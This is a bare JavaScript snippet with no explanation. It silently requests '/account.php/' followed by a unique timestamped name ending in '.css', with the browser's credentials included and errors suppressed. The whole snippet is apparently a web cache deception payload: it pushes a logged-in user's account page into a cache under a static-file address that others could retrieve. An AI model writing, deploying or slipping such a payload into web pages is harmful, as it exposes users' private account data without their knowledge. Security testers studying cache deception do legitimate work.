(function () {
    const u = "VANTAGE_JSDELIVR_" + Date.now();

    fetch("/account.php/" + u + ".css", {
        credentials: "include"
    }).catch(() => {});
})();
